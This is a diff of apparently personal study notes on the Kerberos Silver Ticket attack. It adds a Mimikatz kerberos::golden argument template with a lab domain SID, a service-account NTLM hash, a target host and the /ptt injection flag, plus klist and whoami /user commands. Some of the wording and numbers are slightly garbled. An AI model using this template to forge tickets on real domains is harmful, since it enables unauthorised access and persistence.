@@ -12,7 +12,10 @@ toc: true
 
 <img src="/img/silver/.PNG" alt="Getting-gz" width="1000" height="200"> 
 
+## Goal
+Forge service ticket
 ## Silver Ticket
+* Technique to maintain persistence in an already compromised domain
 * A Silver Ticket is a forged Kerberos Ticket Granting Service (TGS) ticket
 * A silver ticket attack involves compromising credentials and abusing the design of the Kerberos protocol. 
 * A silver ticket only allows an attacker for forge ticket-granting service (TGS) tickets for specific services.
@@ -42,19 +45,33 @@ Silver Ticket Attacks are post-exploitation attacks. That means that a threat ac
 
 ## Argument
 ```
-    kerberos::golden  ##Name of the module (there is no Silver module!) 
-    /User:Administrator  ##Username for which the TGT is generated 
-    /domain :karim.net    ## Domain FQDN 
-    /sid:S-1-5-21-268341927-4156871508-1792461683  SID of the domain 
-    /target : dcorp-dc dol larcorp .moneycorp .local  Target server FQDN 
-    /service: cifs  The SPN name of service for which TGS is to be created 
-    /rc4:6f5b5acaf7433b3282ac22e21e62ff22  ## NTLM (RC4) hash of the service account. Use /aes128 and       /aes256 for using AES keys. 
-    /id:500 /groups:512    ## Optional User RID (default 500) and Group (default 513 512 520 518 519) 
-    ptt /  ##Injects the ticket in current PowerShell process, no  to save the ticket on disk 
-    Persistence - Silver Ticket 
-
-                /startoffset:0  Optional when the ticket is available (default 0 - right now) in minutes. Use           negative for a ticket available from past and a larger number for future.  
-                /endin:600 ##Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is          10 hours = 600 minutes
-                /renewmax:10080 ##Optional ticket lifetime with renewal (default is 10 years) in minutes. The           default AD setting is 7 days = 100800 
+kerberos::golden     ##Name of the module (there is no Silver module) 
+/User:Administrator  ##Username for which the TGT is generated 
+/domain :karim.net   ## Domain Name 
+/sid:S-1-5-21-750046758-1551849808-2392872301 ## SID of the domain 
+/target : win10.karim.net ## Target machine
+/service: cifs  The SPN name of service for which TGS is to be created 
+/rc4:6f5b5acaf7433b3282ac22e21e62ff22  ## NTLM  hash of the service account.
+/id:500 /groups:512    ## Optional User RID (default 500) and Group (default 513 512 520 518 519) 
+/ptt    ##Injects the ticket in current PowerShell process, no  to save the ticket on disk 
+/startoffset:0  (Optional)the start offset when the ticket is available (default 0)
+/endin:600 ##Optional ticket lifetime (default is 10 years) . The default AD setting is 10 hours = 600 minutes
+/renewmax:10080 ##Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 
                 
  ```
+ 
+List current tickets
+```
+klist
+```
+
+<img src="/img/silver/.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+ 
+Getting a user's SID
+```
+whoami /user
+```
+<img src="/img/silver/sid.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+
